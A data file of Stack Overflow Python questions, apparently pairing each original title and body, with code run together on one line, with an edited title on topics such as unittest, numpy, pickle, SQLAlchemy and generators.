"python, unittest - Pass command line args to setUp of unittest.TestCase"," I have a script that acts as a wrapper for some unit tests written using the Python unittest module. In addition to cleaning up some files, creating an output stream and generating some code, it loads test cases into a suite using I am already using optparse to pull out several command-line arguments used for determining the output location, whether to regenerate code and whether to do some clean up. I also want to pass a configuration variable, namely an endpoint URI, for use within the test cases.I realize I can add an OptionParser to the setUp method of the TestCase, but I want to instead pass the option to setUp. Is this possible using loadTestsFromTestCase()? I can iterate over the returned TestSuite's TestCases, but can I manually call setUp on the TestCases?** EDIT **I wanted to point out that I am able to pass the arguments to setUp if I iterate over the tests and call setUp manually like: However, I am using xmlrunner for this and its run method takes a TestSuite as an argument. I assume it will run the setUp method itself, so I would need the parameters available within the XMLTestRunner. <code>  unittest.TestLoader().loadTestsFromTestCase() (options, args) = op.parse_args()suite = unittest.TestLoader().loadTestsFromTestCase(MyTests.TestSOAPFunctions)for test in suite: test.setUp(options.soap_uri)","Python, unit test - Pass command line arguments to setUp of unittest.TestCase"
Call class method from variable in Python," If I have a Python class, and would like to call a function from it depending on a variable, how would I do so? I imagined following could do it: But it couldn't. Any other way to do this? <code>  class CallMe: # Class def App(): # Method one ... def Foo(): # Method two ...variable = ""App"" # Method to callCallMe.variable() # Calling App()",Call method from string
Python static methods - how to call a method from another method," When I have regular methods for calling another method in a class, I have to do this but when I have static methods I can't write because there is no instance. What do I have to do in Python for calling an static method from another static method of the same class? <code>  class test: def __init__(self): pass def dosomething(self): print ""do something"" self.dosomethingelse() def dosomethingelse(self): print ""do something else"" self.dosomethingelse()",Static methods - How to call a method from another method?
Calculating SHA1 of a file," I'm trying to calculate the SHA-1 value of a file. I've fabricated this script: For a specific file I get this hash value:8c3e109ff260f7b11087974ef7bcdbdc69a0a3b9But when i calculate the value with git hash_object, then I get this value: d339346ca154f6ed9e92205c3c5c38112e761eb7How come they differ? Am I doing something wrong, or can I just ignore the difference? <code>  def hashfile(filepath): sha1 = hashlib.sha1() f = open(filepath, 'rb') try: sha1.update(f.read()) finally: f.close() return sha1.hexdigest()","Why is the Python calculated ""hashlib.sha1"" different from ""git hash-object"" for a file?"
"Euclidean distance between points in two different Numpy arrays, not within"," I have two arrays of x-y coordinates, and I would like to find the minimum Euclidean distance between each point in one array with all the points in the other array. The arrays are not necessarily the same size. For example: My current method loops through each coordinate xy in xy1 and calculates the distances between that coordinate and the other coordinates. Is there a way to eliminate the for loop and somehow do element-by-element calculations between the two arrays? I envision generating a distance matrix for which I could find the minimum element in each row or column.Another way to look at the problem. Say I concatenate xy1 (length m) and xy2 (length p) into xy (length n), and I store the lengths of the original arrays. Theoretically, I should then be able to generate a n x n distance matrix from those coordinates from which I can grab an m x p submatrix. Is there a way to efficiently generate this submatrix? <code>  xy1=numpy.array([[ 243, 3173],[ 525, 2997]])xy2=numpy.array([[ 682, 2644],[ 277, 2651],[ 396, 2640]]) mindist=numpy.zeros(len(xy1))minid=numpy.zeros(len(xy1))for i,xy in enumerate(xy1): dists=numpy.sqrt(numpy.sum((xy-xy2)**2,axis=1)) mindist[i],minid[i]=dists.min(),dists.argmin()","Minimum Euclidean distance between points in two different Numpy arrays, not within"
how to redirect complete output of a script," I have a simple cronjob running every day at 18:35: So the output of ~/job.sh should be written into ~/job.log. In job.sh, there are some echo commands and a few python scripts are executed, e.g.: Now, whatever output the python scripts produce, they are not written into ~/job.log. I only see the echo text in ~/job.log. How can I redirect the complete output of the shell script to ~/job.log? <code>  05 18 * * * ~/job.sh 2>&1 >> ~/job.log echo 'doing xyz'python doXYZ.py",How to redirect complete output of a cron script
Python/Linux - A function callback everything a key is pressed (regardless of which window has focus)?," I want to write a programme (in python) on Linux (Ubuntu Linux 9.10) that will keep track of how many key presses per second/minute I make. This includes normal letter keys, and control/shift/space/etc.Is there some way to hook into X so that I can say ""when a key is pressed call this function?"". Since I want to have this running in the background while I work normally, this function call will have to be able to be aware of all key presses for all programmes. I suppose it's a bit like a keylogger.This is only a personal thing, so I don't care about making it work on Windows/OSX, and I don't care about when people have fancy remote X sessions etc. <code> ",A function callback every time a key is pressed (regardless of which window has focus)?
Python/Linux - A function callback every time a key is pressed (regardless of which window has focus)?," I want to write a programme (in python) on Linux (Ubuntu Linux 9.10) that will keep track of how many key presses per second/minute I make. This includes normal letter keys, and control/shift/space/etc.Is there some way to hook into X so that I can say ""when a key is pressed call this function?"". Since I want to have this running in the background while I work normally, this function call will have to be able to be aware of all key presses for all programmes. I suppose it's a bit like a keylogger.This is only a personal thing, so I don't care about making it work on Windows/OSX, and I don't care about when people have fancy remote X sessions etc. <code> ",A function callback every time a key is pressed (regardless of which window has focus)?
Whats to bad with threadlocals," Everybody in Django world seems to hate threadlocals(http://code.djangoproject.com/ticket/4280, http://code.djangoproject.com/wiki/CookBookThreadlocalsAndUser). I read Armin's essay on this(http://lucumr.pocoo.org/2006/7/10/why-i-cant-stand-threadlocal-and-others), but most of it hinges on threadlocals is bad because it is inelegant. I have a scenario where theadlocals will make things significantly easier. (I have a app where people will have subdomains, so all the models need to have access to the current subdomain, and passing them from requests is not worth it, if the only problem with threadlocals is that they are inelegant, or make for brittle code.)Also a lot of Java frameworks seem to be using threadlocals a lot, so how is their case different from Python/Django 's? <code> ",What is so bad with threadlocals
Python many-to-one mapping (or equivalence classes)," I have a project of converting one database to another. One of the original database columns defines the row's category. This column should be mapped to a new category in the new database.For example, let's assume the original categories are:parrot, spam, cheese_shop, Cleese, Gilliam, PalinNow that's a little verbose for me, And I want to have these rows categorized as sketch, actor - That is, define all the sketches and all the actors as two equivalence classes. That's quite awkward- I would prefer having something like: But this, of course, sets the entire tuple as a key: Any ideas how to create an elegant many-to-one dictionary in Python? <code>  >>> monty={'parrot':'sketch', 'spam':'sketch', 'cheese_shop':'sketch', 'Cleese':'actor', 'Gilliam':'actor', 'Palin':'actor'}>>> monty{'Gilliam': 'actor', 'Cleese': 'actor', 'parrot': 'sketch', 'spam': 'sketch', 'Palin': 'actor', 'cheese_shop': 'sketch'} monty={ ('parrot','spam','cheese_shop'): 'sketch', ('Cleese', 'Gilliam', 'Palin') : 'actors'} >>> monty['parrot']Traceback (most recent call last): File ""<pyshell#29>"", line 1, in <module> monty['parrot']KeyError: 'parrot'",Many-to-one mapping (creating equivalence classes)
Python many-to-one mapping (creating equivalence classes)," I have a project of converting one database to another. One of the original database columns defines the row's category. This column should be mapped to a new category in the new database.For example, let's assume the original categories are:parrot, spam, cheese_shop, Cleese, Gilliam, PalinNow that's a little verbose for me, And I want to have these rows categorized as sketch, actor - That is, define all the sketches and all the actors as two equivalence classes. That's quite awkward- I would prefer having something like: But this, of course, sets the entire tuple as a key: Any ideas how to create an elegant many-to-one dictionary in Python? <code>  >>> monty={'parrot':'sketch', 'spam':'sketch', 'cheese_shop':'sketch', 'Cleese':'actor', 'Gilliam':'actor', 'Palin':'actor'}>>> monty{'Gilliam': 'actor', 'Cleese': 'actor', 'parrot': 'sketch', 'spam': 'sketch', 'Palin': 'actor', 'cheese_shop': 'sketch'} monty={ ('parrot','spam','cheese_shop'): 'sketch', ('Cleese', 'Gilliam', 'Palin') : 'actors'} >>> monty['parrot']Traceback (most recent call last): File ""<pyshell#29>"", line 1, in <module> monty['parrot']KeyError: 'parrot'",Many-to-one mapping (creating equivalence classes)
Why this code behaves differentely in Python3.1 than in Python2.6?," I'm very new to programming so I apologize in advance if my question is too silly. Executing this code in Python 2.6 prints letters a, b, c, d , each line of output appears after a second. This is expected behavior. But in Python 3.1 execution is blocked at line output=p.stdout.readline(). How to correct this for Python 3.1?  <code>  #!/usr/bin/python2.6 import subprocess, time p=subprocess.Popen(['cat'], stdin=subprocess.PIPE, stdout=subprocess.PIPE) for i in 'abcd': p.stdin.write(str.encode(i+'\n')) output=p.stdout.readline() print(output) time.sleep(1)",Why does this code behave differently in Python3.1 than in Python2.6?
"what is deepcopy's second parameter does,"," why c print thatPlease try to use the code, rather than text, because my English is not very good, thank youin django.utils.tree.py print : <code>  from copy import* a=[1,2,3,4]c={'a':'aaa'}print c#{'a': 'aaa'}b=deepcopy(a,c)print bprint c# print {'a': 'aaa', 10310992: 3, 10310980: 4, 10311016: 1, 11588784: [1, 2, 3, 4, [1, 2, 3, 4]], 11566456: [1, 2, 3, 4], 10311004: 2} def __deepcopy__(self, memodict): """""" Utility method used by copy.deepcopy(). """""" obj = Node(connector=self.connector, negated=self.negated) obj.__class__ = self.__class__ obj.children = deepcopy(self.children, memodict) obj.subtree_parents = deepcopy(self.subtree_parents, memodict) return objimport copymemo = {}x1 = range(5)x2=range(6,9)x3=[2,3,4,11]y1 = copy.deepcopy(x1, memo)y2=copy.deepcopy(x2, memo)y3=copy.deepcopy(x3,memo)print memoprint id(y1),id(y2),id(y3)y1[0]='www'print y1,y2,y3print memo {10310992: 3, 10310980: 4, 10311016: 1, 11588784: [0, 1, 2, 3, 4, [0, 1, 2, 3, 4]], 10311028: 0, 11566456: [0, 1, 2, 3, 4], 10311004: 2}{11572448: [6, 7, 8], 10310992: 3, 10310980: 4, 10311016: 1, 11572368: [2, 3, 4, 11], 10310956: 6, 10310896: 11, 10310944: 7, 11588784: [0, 1, 2, 3, 4, [0, 1, 2, 3, 4], 6, 7, 8, [6, 7, 8], 11, [2, 3, 4, 11]], 10311028: 0, 11566456: [0, 1, 2, 3, 4], 10310932: 8, 10311004: 2}11572408 11581280 11580960['www', 1, 2, 3, 4] [6, 7, 8] [2, 3, 4, 11]{11572448: [6, 7, 8], 10310992: 3, 10310980: 4, 10311016: 1, 11572368: [2, 3, 4, 11], 10310956: 6, 10310896: 11, 10310944: 7, 11588784: [0, 1, 2, 3, 4, [0, 1, 2, 3, 4], 6, 7, 8, [6, 7, 8], 11, [2, 3, 4, 11]], 10311028: 0, 11566456: ['www', 1, 2, 3, 4], 10310932: 8, 10311004: 2}","What is the purpose of deepcopy's second parameter, memo?"
"why this code has __iter__ function ,but not has 'next' function,how can be call."," I have the following code in django.template: The part I am confused about is below. How does this __iter__ method work? I can't find any corresponding next method. This is the only way that I know how to implement __iter__: In your answers, try to use code examples rather than text, because my English is not very good. <code>  class Template(object): def __init__(self, template_string, origin=None, name='<Unknown Template>'): try: template_string = smart_unicode(template_string) except UnicodeDecodeError: raise TemplateEncodingError(""Templates can only be constructed from unicode or UTF-8 strings."") if settings.TEMPLATE_DEBUG and origin is None: origin = StringOrigin(template_string) self.nodelist = compile_string(template_string, origin) self.name = name def __iter__(self): for node in self.nodelist: for subnode in node: yield subnode def render(self, context): ""Display stage -- can be called many times"" return self.nodelist.render(context) def __iter__(self): for node in self.nodelist: for subnode in node: yield subnode class a(object): def __init__(self,x=10): self.x = x def __iter__(self): return self def next(self): if self.x > 0: self.x-=1 return self.x else: raise StopIteration ainst = a() for item in aisnt: print item","How does this class implement the ""__iter__"" method without implementing ""next""?"
wrong quadration with numpy," With this code I get this answer. Why do I get negative values? <code>  import numpy as npa = np.arange(1000000).reshape(1000,1000)print(a**2) [[ 0 1 4 ..., 994009 996004 998001] [ 1000000 1002001 1004004 ..., 3988009 3992004 3996001] [ 4000000 4004001 4008004 ..., 8982009 8988004 8994001] ..., [1871554624 1873548625 1875542628 ..., -434400663 -432404668 -430408671] [-428412672 -426416671 -424420668 ..., 1562593337 1564591332 1566589329] [1568587328 1570585329 1572583332 ..., -733379959 -731379964 -729379967]]",Integer overflow in numpy arrays
"what is this code mean,""print >>  sys.stderr"""," Why print '>>' in front of sys.stderr?Thanks. <code>  print >> sys.stderr, ""Error in atexit._run_exitfuncs:""","What does this code mean: ""print >> sys.stderr"""
My own OCR-programm in Pyhton," I am still a beginner but I want to write a character-recognition-program. This program isn't ready yet. And I edited a lot, therefor the comments may not match exactly. I will use the 8-connectivity for the connected component labeling. <code>  from PIL import Imageimport numpy as npim = Image.open(""D:\\Python26\\PYTHON-PROGRAMME\\bild_schrift.jpg"")w,h = im.sizew = int(w)h = int(h)#2D-Array for areaarea = []for x in range(w): area.append([]) for y in range(h): area[x].append(2) #number 0 is white, number 1 is black#2D-Array for letterletter = []for x in range(50): letter.append([]) for y in range(50): letter[x].append(0)#2D-Array for labellabel = []for x in range(50): label.append([]) for y in range(50): label[x].append(0)#image to number conversionpix = im.load()threshold = 200for x in range(w): for y in range(h): aaa = pix[x, y] bbb = aaa[0] + aaa[1] + aaa[2] #total value if bbb<=threshold: area[x][y] = 1 if bbb>threshold: area[x][y] = 0np.set_printoptions(threshold='nan', linewidth=10)#matrix transponationccc = np.array(area) area = ccc.T #better solution?#find all black pixel and set temporary label numbersi=1for x in range(40): # width (later) for y in range(40): # heigth (later) if area[x][y]==1: letter[x][y]=1 label[x][y]=i i += 1#connected components labelingfor x in range(40): # width (later) for y in range(40): # heigth (later) if area[x][y]==1: label[x][y]=i #if pixel has neighbour: if area[x][y+1]==1: #pixel and neighbour get the lowest label pass # tomorrows work if area[x+1][y]==1: #pixel and neighbour get the lowest label pass # tomorrows work #should i also compare pixel and left neighbour?#find width of the letter#find height of the letter#find the middle of the letter#middle = [width/2][height/2] #?#divide letter into 30 parts --> 5 x 6 array#model letter#letter A-Z, a-z, 0-9 (maybe more)#compare each of the 30 parts of the letter with all model letters#make a weighting#print(letter)im.save(""D:\\Python26\\PYTHON-PROGRAMME\\bild2.jpg"")print('done')",My own OCR-program in Python
My own OCR-programm in Python," I am still a beginner but I want to write a character-recognition-program. This program isn't ready yet. And I edited a lot, therefor the comments may not match exactly. I will use the 8-connectivity for the connected component labeling. <code>  from PIL import Imageimport numpy as npim = Image.open(""D:\\Python26\\PYTHON-PROGRAMME\\bild_schrift.jpg"")w,h = im.sizew = int(w)h = int(h)#2D-Array for areaarea = []for x in range(w): area.append([]) for y in range(h): area[x].append(2) #number 0 is white, number 1 is black#2D-Array for letterletter = []for x in range(50): letter.append([]) for y in range(50): letter[x].append(0)#2D-Array for labellabel = []for x in range(50): label.append([]) for y in range(50): label[x].append(0)#image to number conversionpix = im.load()threshold = 200for x in range(w): for y in range(h): aaa = pix[x, y] bbb = aaa[0] + aaa[1] + aaa[2] #total value if bbb<=threshold: area[x][y] = 1 if bbb>threshold: area[x][y] = 0np.set_printoptions(threshold='nan', linewidth=10)#matrix transponationccc = np.array(area) area = ccc.T #better solution?#find all black pixel and set temporary label numbersi=1for x in range(40): # width (later) for y in range(40): # heigth (later) if area[x][y]==1: letter[x][y]=1 label[x][y]=i i += 1#connected components labelingfor x in range(40): # width (later) for y in range(40): # heigth (later) if area[x][y]==1: label[x][y]=i #if pixel has neighbour: if area[x][y+1]==1: #pixel and neighbour get the lowest label pass # tomorrows work if area[x+1][y]==1: #pixel and neighbour get the lowest label pass # tomorrows work #should i also compare pixel and left neighbour?#find width of the letter#find height of the letter#find the middle of the letter#middle = [width/2][height/2] #?#divide letter into 30 parts --> 5 x 6 array#model letter#letter A-Z, a-z, 0-9 (maybe more)#compare each of the 30 parts of the letter with all model letters#make a weighting#print(letter)im.save(""D:\\Python26\\PYTHON-PROGRAMME\\bild2.jpg"")print('done')",My own OCR-program in Python
applying image decoration (border) in Python (programatically) ," I am looking for a way to create a border in python.Is there any library in Python which we can import to create a border.Note that I do not want to use any image masks to create this effect (e.g. I don't want to use any image editing package like GIMP to create a border image mask) . Here is what I am looking for: ...I can write my own methods to add borders .. but if there is already something like this out there with a comprehensive set of border options, I would like to make use of it.I looked at PIL documentation and couldn't find a way to do this. I have windows xp and there doesn't seem to be a way to install PythonMagick either for Python 2.6 if you don't have cygwin.  <code>  import fooImageBorders import Image foo = Image.open(""someImage.jpg"")foo2 = fooImageBorders.bevel(foo, color = black)",applying image decoration (border) in Python (programmatically)
How can I disable clear of clipboard on exit of PyQt4 application?," I have a simple PyQt4 application (see the code below) that reveals a problem: if I select the text from a QLineEdit and copy it to the clipboard, then I can paste it to another application only while my application is running. It seems that on exit, PyQt application clears the clipboard so I can't paste the text after the application is closed.What can I do to avoid this problem?PyQt 4.4.3 @ Python 2.5 @ Windows XP. Also this effect confirmed on PyQt 4.5+, and on Linux too. <code>  import sysfrom PyQt4 import QtGuiapp = QtGui.QApplication(sys.argv)edit = QtGui.QLineEdit()edit.setText('foo bar')edit.show()app.exec_()",How can I disable clear of clipboard on exit of PyQt application?
Learn Go Or Improve My Python Knowledge," I was reading about Go, and I can see that it's very good and can be a language used by many developers in some months, but I want to decide a simple thing: Learn Go or improve my Python or Ruby knowledge?Years developing with Python: 1Years developing with Ruby: 0.3 <code> ",Learn Go Or Improve My Python/Ruby Knowledge
Very Basic BeautifulSoup Task," I am learning Python and BeautifulSoup to scrape data from the web, and read a HTML table. I can read it into Open Office and it says that it is Table #11.It seems like BeautifulSoup is the preferred choice, but can anyone tell me how to grab a particular table and all the rows? I have looked at the module documentation, but can't get my head around it. Many of the examples that I have found online appear to do more than I need. <code> ",How do you get all the rows from a particular table using BeautifulSoup?
VIM Python Indentation not working?," I have Vim 7 (enhanced) on CentOS 5, and it comes with all the usual Vim plugins/scripts ready to go. I would think that when opening a file ending in .py (vim file.py) it would automatically load these plugins, but I am not sure that is the case. What I want is:Press TAB and receive four spaces. Auto indent next line for suites, conditionals, etc.I have this working by explicitly setting tabstop, shiftwidth, etc. in my .vimrc file. Isn't this what the above Python files are for? Why do I have to set these things in my .vimrc? How do I get these features from the Vim plugins instead?Current .vimrc: <code>  $ find /usr/share/vim/vim70/ -name \*python\*/usr/share/vim/vim70/syntax/python.vim/usr/share/vim/vim70/ftplugin/python.vim/usr/share/vim/vim70/indent/python.vim/usr/share/vim/vim70/autoload/pythoncomplete.vim syntax onset hlsset expandtabset textwidth=0set tabstop=4set softtabstop=4set shiftwidth=4set autoindentset backspace=indent,eol,startset incsearchset ignorecaseset rulerset wildmenuset smarttabfiletype indent onfiletype onfiletype plugin on",Vim Python indentation not working?
How to get VIM to merge XML from external entities," I know this is a borderline case whether it really belongs to stackoverflow or superuser, but as it seems there are quite a few 'editing code' questions over here, I am posting it on SO.I have a pile of XML files that someone in their infinite wisdom have decided to explode to a multiple files using the tags, which in result makes debugging/editing them a huge P-i-t-A. Therefore I am looking for:A way in VIM to open them in a single buffer (preferably so that the changes are saved in correct external entity files), OR;A way to expand the files in VIM so that the external entities are read and replaced in the buffer, OR;an easy bash/sed/python way of doing this on a command line (or in .vimrc)The files included on top level might include new files and so on on who knows on how many levels so this needs to be recursive...Here's a mockup sample on what the top level file looks like: EDIT:The list is in order of preference - if no 1. or 2. solutions are available, the bounty goes for the best #3...EDIT 2:Looks like @Gaby 's answer works, but unfortunately only partially, unless I am doing something wrong - I'll write some sort of tool using his answer and post it here for improvements. Of course, a #1 or #2 solution would be appreciated... :)EDIT 3:Ok, the best non-Emacs -answer will get the bounty ;)Conclusion:Thanks to @hcayless I now have a working #2 solution, I added: to my .vimrc and everything is hunky dory. <code>  <?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foobar PUBLIC ""foobar:dtd"" ""foobar.dtd"" [ <!ENTITY foo SYSTEM ""foo.xml""> <!ENTITY bar SYSTEM ""bar.xml"">]><foo> <params> &foo; </params> <bar> &bar; </bar></foo> autocmd BufReadPost,FileReadPost *.xml silent %!xmllint --noent - 2> /dev/null",How to get a flat XML so that external entities are merged to the top level
Python: How does yield statement work in this situation?," I don't really understand how yield statement works in this situation. The problem says that given an expression without parentheses, write a function to generate all possible fully parenthesized (FP) expressions. Say, the input is '1+2+3+4' which should be generated to 5 FP expressions:(1+(2+(3+4)))(1+((2+3)+4))((1+2)+(3+4))((1+(2+3))+4)(((1+2)+3)+4)My code is as follows. If I use return statement (the commented out lines), then the code works as expected. However, when I change to yield statement as the code shows, I only get the first 4 results. If the number of operands of the input expression is increased, then of course more results will be lost. For example, for the input '1+2+3+4+5', I only get 8 instead of 14.I finally figure out the way to make the code work by commenting out the line firstG, secondG = f(first), f(second) and replace the linefor e in ('(' + e1 + op + e2 + ')' for e1 in firstG for e2 in secondG):byfor e in ('(' + e1 + op + e2 + ')' for e1 in f(first) for e2 in f(second)):That means some 'information' of the generator is lost because of the line firstG, secondG = f(first), f(second) but I can't figure out the real reason. Could you guys give me some ideas? <code>  OPS = ('+', '-', '*', '/')def f(expr): """""" Generates FP exprs Recursive formula: f(expr1[op]expr2) = (f(expr1) [op] f(expr2)) """""" if expr.isdigit(): yield expr# return [expr]# ret = [] first = '' i = 0 while i < len(expr): if expr[i] not in OPS: first += expr[i] i += 1 else: op = expr[i] i += 1 second = expr[i:] firstG, secondG = f(first), f(second) for e in ('(' + e1 + op + e2 + ')' for e1 in firstG for e2 in secondG): yield e# ret.append(e) first += op# return ret",Different results from yield vs return
How to change predeclared variables in Python," I am trying to change a variable further down the program. I have a global variable declared at the start of the program and I want to change the variable in different functions down the program. I can do this by declaring the variable inside the function again but I would like to know is there a better way of doing this. Some test code is below to explain what I mean. Has anyone any ideas, thanksI have tried the global variable but when I do this the project variable still prints out YepNo instead of YepYES. I want the new variable from the function proto change the variable in the project variable. <code>  ID = 'No'project = (""Yep""+ID) # ID added with 'No' value which I later want to changedef pro(): ID = ""YES"" print IDdef pro1(ID): # I could declare project again to get this to work, but I would like to avoid this print project # I want this to print with the new ID number.if __name__ == '__main__': pro() pro1(ID)",How to change global variables in Python
How to change variables in Python," I am trying to change a variable further down the program. I have a global variable declared at the start of the program and I want to change the variable in different functions down the program. I can do this by declaring the variable inside the function again but I would like to know is there a better way of doing this. Some test code is below to explain what I mean. Has anyone any ideas, thanksI have tried the global variable but when I do this the project variable still prints out YepNo instead of YepYES. I want the new variable from the function proto change the variable in the project variable. <code>  ID = 'No'project = (""Yep""+ID) # ID added with 'No' value which I later want to changedef pro(): ID = ""YES"" print IDdef pro1(ID): # I could declare project again to get this to work, but I would like to avoid this print project # I want this to print with the new ID number.if __name__ == '__main__': pro() pro1(ID)",How to change global variables in Python
Is it possible to store python class objects in sqlite ?, I would like to store Python objects into a SQLite database. Is that possible?If so what would be some links / examples for it? <code> ,Is it possible to store Python class objects in SQLite?
PyPlot reverse Y-Axis ," I have a scatter plot graph with a bunch of random x, y coordinates. Currently the Y-Axis starts at 0 and goes up to the max value. I would like the Y-Axis to start at the max value and go up to 0. <code>  points = [(10,5), (5,11), (24,13), (7,8)] x_arr = []y_arr = []for x,y in points: x_arr.append(x) y_arr.append(y)plt.scatter(x_arr,y_arr)",Reverse Y-Axis in PyPlot
serializing python objects to XML," I need to serialize my Python objects into XML data. I tried to use Django, but it only works for QuerySet objects and not for any simple Python object.How can I serialize a Python object into XML data? <code> ",How can I serialize Python objects to XML?
Python: Elements not in a list," So heres my code: z contains a list of integers. I want to compare item to z and print out the numbers that are not in z when compared to item.I can print the elements that are in z when compared not item, but when I try and do the opposite using the code above nothing prints.Any help? <code>  item = [0,1,2,3,4,5,6,7,8,9]z = [] # list of integersfor item in z: if item not in z: print item",Finding elements not in a list
Parse boolean arithmetic including parentheses?," Is there a single regular expression that can parse a string (in Python and/or Javascript, does not need to be the same expression) that represents simple boolean arithmetic? For example I want to parse this string: Assuming that:* parentheses do not nest* the terms a, b, ..., z are not sub-expressionsThe resulting captures should be grouped by parentheses first, which I then parse again with the same or a simpler regex.I've had success writing a naive regex for parsing boolean arithmetic without parentheses.Any ideas? <code>  a and (b and c) and d or e and (f or g)",Parse boolean arithmetic including parentheses with regex?
What's the differnece between filter and filter_by in SQLAlchemy?, Could anyone explain the difference between filter and filter_by functions in SQLAlchemy?Which one should I be using? <code> ,Difference between filter and filter_by in SQLAlchemy
What's the difference between filter and filter_by in SQLAlchemy?, Could anyone explain the difference between filter and filter_by functions in SQLAlchemy?Which one should I be using? <code> ,Difference between filter and filter_by in SQLAlchemy
Hitting Maximum Recursion Depth Using Python's Pickle / cPickle," The background: I'm building a trie to represent a dictionary, using a minimal construction algorithm. The input list is 4.3M utf-8 strings, sorted lexicographically. The resulting graph is acyclic and has a maximum depth of 638 nodes. The first line of my script sets the recursion limit to 1100 via sys.setrecursionlimit().The problem: I'd like to be able to serialize my trie to disk, so I can load it into memory without having to rebuild from scratch (roughly 22 minutes). I have tried both pickle.dump() and cPickle.dump(), with both the text and binary protocols. Each time, I get a stack-trace that looks like the following: My data structures are relatively simple: trie contains a reference to a start state, and defines some methods. dfa_state contains a boolean field, a string field, and a dictionary mapping from label to state.I'm not very familiar with the inner workings of pickle - does my max recursion depth need to be greater/equal n times the depth of the trie for some n? Or could this be caused by something else I'm unaware of?Update: Setting the recursion depth to 3000 didn't help, so this avenue doesn't look promising.Update 2: You guys were right; I was being short-sighted in assuming that pickle would use a small nesting depth due to default recursion limitations. 10,000 did the trick. <code>  File ""/System/Library/Frameworks/Python.framework/Versions/2.5/lib/python2.5/pickle.py"", line 649, in save_dict self._batch_setitems(obj.iteritems()) File ""/System/Library/Frameworks/Python.framework/Versions/2.5/lib/python2.5/pickle.py"", line 663, in _batch_setitems save(v) File ""/System/Library/Frameworks/Python.framework/Versions/2.5/lib/python2.5/pickle.py"", line 286, in save f(self, obj) # Call unbound method with explicit self File ""/System/Library/Frameworks/Python.framework/Versions/2.5/lib/python2.5/pickle.py"", line 725, in save_inst save(stuff) File ""/System/Library/Frameworks/Python.framework/Versions/2.5/lib/python2.5/pickle.py"", line 286, in save f(self, obj) # Call unbound method with explicit self File ""/System/Library/Frameworks/Python.framework/Versions/2.5/lib/python2.5/pickle.py"", line 648, in save_dict self.memoize(obj)RuntimeError: maximum recursion depth exceeded",Hitting Maximum Recursion Depth Using Pickle / cPickle
Flatten (an irregular) list of lists in Python," Yes, I know this subject has been covered before (here, here, here, here), but as far as I know, all solutions, except for one, fail on a list like this: Where the desired output is Or perhaps even better, an iterator. The only solution I saw that works for an arbitrary nesting is found in this question: Is this the best model? Did I overlook something? Any problems? <code>  L = [[[1, 2, 3], [4, 5]], 6] [1, 2, 3, 4, 5, 6] def flatten(x): result = [] for el in x: if hasattr(el, ""__iter__"") and not isinstance(el, basestring): result.extend(flatten(el)) else: result.append(el) return resultflatten(L)",Flatten an irregular list of lists
Flatten (an irregular) list of lists," Yes, I know this subject has been covered before (here, here, here, here), but as far as I know, all solutions, except for one, fail on a list like this: Where the desired output is Or perhaps even better, an iterator. The only solution I saw that works for an arbitrary nesting is found in this question: Is this the best model? Did I overlook something? Any problems? <code>  L = [[[1, 2, 3], [4, 5]], 6] [1, 2, 3, 4, 5, 6] def flatten(x): result = [] for el in x: if hasattr(el, ""__iter__"") and not isinstance(el, basestring): result.extend(flatten(el)) else: result.append(el) return resultflatten(L)",Flatten an irregular list of lists
Send/Receive sms using AT command from fedora in python Application ," Can anyone help me to send and receive SMS using AT commands in Python?In case it matters, I'm using Fedora 8.Which phone will be better with Linux (Nokia, Sony Ericson, Samsung,.....)?Will all phones support sending and receiving SMS using AT commands? <code> ",How to Send/Receive SMS using AT commands?
Python: namedtuple._replace() doesn't work as descrbed in the documentation.," I was having trouble implementing namedtuple._replace(), so I copied the code right off of the documentation: and I got: instead of: as is shown in the doc.I'm using Python 2.6 on Windows 7What's going on? <code>  Point = namedtuple('Point', 'x,y')p = Point(x=11, y=22)p._replace(x=33)print p Point(x=11, y=22) Point(x=33, y=22)",namedtuple._replace() doesn't work as described in the documentation
Python: namedtuple._replace() doesn't work as descrbed in the documentation," I was having trouble implementing namedtuple._replace(), so I copied the code right off of the documentation: and I got: instead of: as is shown in the doc.I'm using Python 2.6 on Windows 7What's going on? <code>  Point = namedtuple('Point', 'x,y')p = Point(x=11, y=22)p._replace(x=33)print p Point(x=11, y=22) Point(x=33, y=22)",namedtuple._replace() doesn't work as described in the documentation
Django - Iterate over model instance field names and values in template," I'm trying to create a basic template to display the selected instance's field values, along with their names. Think of it as just a standard output of the values of that instance in table format, with the field name (verbose_name specifically if specified on the field) in the first column and the value of that field in the second column.For example, let's say we have the following model definition: I would want it to be output in the template like so (assume an instance with the given values): What I'm trying to achieve is being able to pass an instance of the model to a template and be able to iterate over it dynamically in the template, something like this: Is there a neat, ""Django-approved"" way to do this? It seems like a very common task, and I will need to do it often for this particular project. <code>  class Client(Model): name = CharField(max_length=150) email = EmailField(max_length=100, verbose_name=""E-mail"") Field Name Field Value---------- -----------Name Wayne KoortsE-mail waynes@email.com <table> {% for field in fields %} <tr> <td>{{ field.name }}</td> <td>{{ field.value }}</td> </tr> {% endfor %}</table>",Iterate over model instance field names and values in template
How is the __format__ method suposed to be used int int? #python, I saw there was a __format__ method but help(int.__format__) doesn't provide any help.I also know you're not suppose to call a __method__ directly. When is this method called? Which is its argument? <code> ,How is the __format__ method supposed to be used for int?
How is the __format__ method suposed to be used for int? #python, I saw there was a __format__ method but help(int.__format__) doesn't provide any help.I also know you're not suppose to call a __method__ directly. When is this method called? Which is its argument? <code> ,How is the __format__ method supposed to be used for int?
How is the __format__ method suposed to be used for int?, I saw there was a __format__ method but help(int.__format__) doesn't provide any help.I also know you're not suppose to call a __method__ directly. When is this method called? Which is its argument? <code> ,How is the __format__ method supposed to be used for int?
Python - best way to set a colum in a 2d array to a specific value," I have a 2d array, I would like to set a column to a particular value, my code is below. Is this the best way in python? If I want to set a number of columns to a particular value , how could I extend thisI would like to use the python standard library onlyThanks <code>  rows = 5cols = 10data = (rows * cols) *[0]val = 10set_col = 5for row in range(rows): data[row * cols + set_col - 1] = val",Python - best way to set a column in a 2d array to a specific value
